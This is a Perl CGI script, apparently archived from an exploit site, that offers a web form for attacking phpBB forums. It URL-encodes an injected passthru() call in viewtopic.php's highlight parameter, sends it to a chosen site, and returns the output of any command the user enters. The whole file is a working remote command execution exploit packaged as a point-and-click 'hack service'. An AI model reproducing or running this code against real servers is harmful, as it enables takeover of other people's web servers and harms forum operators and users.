#!/usr/bin/perl

#wphpbb.cgi 
#hack service:)
#http://site/cgi-bin/wphpbb.cgi

use CGI qw(:standard); 
$CGI::HEADERS_ONCE = 1; 
$CGI = new CGI; 

$atak = $CGI->param("atak"); 
$serv = $CGI->param("serv");
$dir = $CGI->param("dir"); 
$topic = $CGI->param("topic"); 
$cmd = $CGI->param("cmd"); 

print $CGI->header(-type=>'text/html',-charset=>'windows-1254'); 
print qq~<html><head> <meta http-equiv=Content-Type" content=text/html; charset=ISO-8859-9><title>phpBB HACK</title></head> 
<body bgcolor=black text=red>phpBB atak webscript<br>
<font color=blue>exploit:by RusH security team // www.rst.void.ru<br>
exploit update:ZzagorR</font><br>
<table align=left><tr>
<form action=? method=post>
<input type=hidden name=atak value=phpbb>
<td>Site: </td><td><input type=text name=serv value=$serv size=50><br><font color=blue>example: www.site.com</font></td></tr>
<tr><td>Klasor: </td><td><input type=text name=dir value=$dir size=50><br><font color=blue>example: /phpBB2/</font></td></tr>
<tr><td>TopicNo: </td><td><input type=text name=topic value=$topic size=10><br><font color=blue>example: 1</font></td></tr>
<tr><td>Komut: </td><td><input type=text name=cmd value=$cmd size=100><br><font color=blue>example: id</font></td></tr>
<tr><td colspan=2 align=center><input type=submit value="Test"></td></tr>~; 

if($atak eq "phpbb") { 



$serv =~ s/(http:\/\/)//eg;
print "<tr><td valign=top colspan=2><font color=white> Sonuclar</font></td></tr>"; 
$cmd=~ s/(.*);$/$1/eg;
$cmd=~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
$topic=~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
$path  = $dir;
$path .= 'viewtopic.php?t=';
$path .= $topic;
$path .= '&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20';
$path .= $cmd;
$path .= '%3B%20%65%63%68%6F%20%5F%45%4E%44%5F';
$path .= '&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';
use IO::Socket;
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "[-] CONNECT FAILED\r\n";
print $socket "GET $path HTTP/1.1\n";
print $socket "Host: $serv\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
$on = 0;
while ($answer = <$socket>)
 {
  if ($answer =~ /^_END_/) { print "<tr><td colspan=2 valign=top><font color=white>Islem Sonu</font></td></tr>\r\n"; exit(); }
  if ($on == 1) { print "<tr><td colspan=2 valign=top>$answer</td></tr>"; }
  if ($answer =~ /^_START_/) { $on = 1; }
 }


print "[-] EXPLOIT BASARISIZ\r\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
}

print "</table></body></html>";

# milw0rm.com [2004-12-03]
